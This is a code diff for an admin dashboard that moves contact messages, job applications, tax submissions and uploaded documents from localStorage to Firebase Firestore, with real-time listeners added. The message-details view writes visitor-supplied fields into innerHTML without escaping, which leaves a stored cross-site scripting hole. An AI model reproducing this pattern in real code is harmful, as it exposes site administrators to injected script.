-        <h4 style="color: var(--primary); margin: 1.5rem 0 1rem;">Submission Details</h4>
-        <div class="detail-row"><div class="detail-label">Application Date</div><div class="detail-value">${new Date(app.timestamp).toLocaleString()}</div></div>
-        <div class="detail-row"><div class="detail-label">IP Address</div><div class="detail-value">${app.ip || 'N/A'}</div></div>
       `;
 
-      document.getElementById('modalTitle').textContent = 'Complete Application Details';
+      document.getElementById('modalTitle').textContent = 'Application Details';
       document.getElementById('modalBody').innerHTML = modalBody;
       document.getElementById('detailModal').classList.add('active');
     }
 
-    function viewMessageDetails(id) {
-      const msgs = JSON.parse(localStorage.getItem(STORAGE_KEYS.CONTACT_MESSAGES)) || [];
-      const msg = msgs.find(m => m.id === id);
-      if (!msg) return;
+    async function viewMessageDetails(id) {
+      const doc = await db.collection('contactMessages').doc(id).get();
+      const msg = doc.data();
+
+      // Mark as read
+      await db.collection('contactMessages').doc(id).update({ status: 'read' });
 
       const modalBody = `
         <div class="detail-row"><div class="detail-label">Name</div><div class="detail-value">${msg.name}</div></div>
@@ -1392,45 +1200,69 @@
         <div class="detail-row"><div class="detail-label">Phone</div><div class="detail-value">${msg.phone || 'Not provided'}</div></div>
         <div class="detail-row"><div class="detail-label">Subject</div><div class="detail-value">${msg.subject}</div></div>
         <div class="detail-row"><div class="detail-label">Message</div><div class="detail-value" style="white-space: pre-wrap;">${msg.message}</div></div>
-        <div class="detail-row"><div class="detail-label">Date</div><div class="detail-value">${new Date(msg.timestamp || msg.date).toLocaleString()}</div></div>
-        <div class="detail-row"><div class="detail-label">IP Address</div><div class="detail-value">${msg.ip || 'N/A'}</div></div>
+        <div class="detail-row"><div class="detail-label">Date</div><div class="detail-value">${msg.timestamp ? new Date(msg.timestamp.toDate()).toLocaleString() : 'N/A'}</div></div>
       `;
 
       document.getElementById('modalTitle').textContent = 'Contact Message';
       document.getElementById('modalBody').innerHTML = modalBody;
       document.getElementById('detailModal').classList.add('active');
       
-      // Mark as read
-      msg.status = 'read';
-      localStorage.setItem(STORAGE_KEYS.CONTACT_MESSAGES, JSON.stringify(msgs));
       loadContacts();
     }
 
-    function markAsRead(id) {
-      const msgs = JSON.parse(localStorage.getItem(STORAGE_KEYS.CONTACT_MESSAGES)) || [];
-      const msg = msgs.find(m => m.id === id);
-      if (msg) {
-        msg.status = 'read';
-        localStorage.setItem(STORAGE_KEYS.CONTACT_MESSAGES, JSON.stringify(msgs));
-        loadContacts();
-        showNotification('Success', 'Message marked as read', 'success');
+    async function markAsRead(id) {
+      await db.collection('contactMessages').doc(id).update({ status: 'read' });
+      loadContacts();
+      showNotification('Success', 'Message marked as read', 'success');
+    }
+
+    async function deleteDocument(id) {
+      if (confirm('Delete this document? This cannot be undone.')) {
+        await db.collection('resourceDocuments').doc(id).delete();
+        loadDocuments();
+        showNotification('Success', 'Document deleted', 'success');
       }
     }
 
-    function exportAsJSON(type, id) {
-      let data = null;
-      if (type === 'tax') {
-        const submissions = JSON.parse(localStorage.getItem(STORAGE_KEYS.TAX_SUBMISSIONS)) || [];
-        data = submissions.find(s => s.id === id);
-      } else if (type === 'application') {
-        const apps = JSON.parse(localStorage.getItem(STORAGE_KEYS.JOB_APPLICATIONS)) || [];
-        data = apps.find(a => a.id === id);
+    // ==================== FILE UPLOAD HANDLER ====================
+    async function handleFileUpload(files) {
+      for (const file of files) {
+        try {
+          // Upload to Firebase Storage
+          const fileData = await uploadFile(file);
+          
+          // Save metadata to Firestore
+          await db.collection('resourceDocuments').add({
+            name: file.name.replace(/\.[^/.]+$/, ""),
+            fileName: file.name,
+            description: `Uploaded on ${new Date().toLocaleDateString()}`,
+            type: file.type.split('/')[1]?.toUpperCase() || file.name.split('.').pop()?.toUpperCase() || 'FILE',
+            size: (file.size / 1024).toFixed(0) + ' KB',
+            icon: file.type.includes('pdf') ? 'fa-file-pdf' : 
+                  file.type.includes('image') ? 'fa-file-image' : 
+                  file.type.includes('word') ? 'fa-file-word' : 'fa-file',
+            url: fileData.url,
+            storagePath: fileData.path,
+            timestamp: firebase.firestore.FieldValue.serverTimestamp()
+          });
+          
+          showNotification('Success', `Uploaded: ${file.name}`, 'success');
+        } catch (error) {
+          console.error('Upload error:', error);
+          showNotification('Error', `Failed to upload ${file.name}`, 'error');
+        }
       }
       
-      if (data) {
-        const jsonStr = JSON.stringify(data, null, 2);
-        downloadFile(jsonStr, `${type}_${id}.json`, 'application/json');
-      }
+      loadDocuments();
+    }
+
+    // ==================== LOAD ALL DATA ====================
+    function loadAllData() {
+      loadTaxSubmissions();
+      loadApplications();
+      loadContacts();
+      loadDocuments();
+      loadLogins();
     }
 
     // ==================== TAB SWITCHING ====================
@@ -1459,7 +1291,8 @@
         loadAllData();
         showNotification('Welcome', 'Logged in successfully', 'success');
         
-        startRealtimeUpdates();
+        // Set up real-time listeners
+        setupRealtimeListeners();
       } else {
         document.getElementById('loginError').style.display = 'flex';
         setTimeout(() => {
@@ -1475,19 +1308,27 @@
       showNotification('Goodbye', 'Logged out successfully', 'info');
     }
 
-    // ==================== REAL-TIME UPDATES ====================
-    function startRealtimeUpdates() {
-      setInterval(() => {
-        if (document.getElementById('dashboardPage').style.display === 'block') {
-          loadAllData();
-        }
-      }, 2000);
-
-      window.addEventListener('storage', (e) => {
-        if (e.key) {
-          loadAllData();
-          showNotification('New Data', `Updated: ${e.key}`, 'info');
-        }
+    // ==================== REAL-TIME LISTENERS ====================
+    function setupRealtimeListeners() {
+      // Listen for changes in all collections
+      db.collection('taxSubmissions').onSnapshot(() => {
+        loadTaxSubmissions();
+      });
+      
+      db.collection('jobApplications').onSnapshot(() => {
+        loadApplications();
+      });
+      
+      db.collection('contactMessages').onSnapshot(() => {
+        loadContacts();
+      });
+      
+      db.collection('resourceDocuments').onSnapshot(() => {
+        loadDocuments();
+      });
+      
+      db.collection('userLogins').onSnapshot(() => {
+        loadLogins();
       });
     }
 
@@ -1505,7 +1346,7 @@
         document.getElementById('loginPage').style.display = 'none';
         document.getElementById('dashboardPage').style.display = 'block';
         loadAllData();
-        startRealtimeUpdates();
+        setupRealtimeListeners();
       }
     });
   </script>
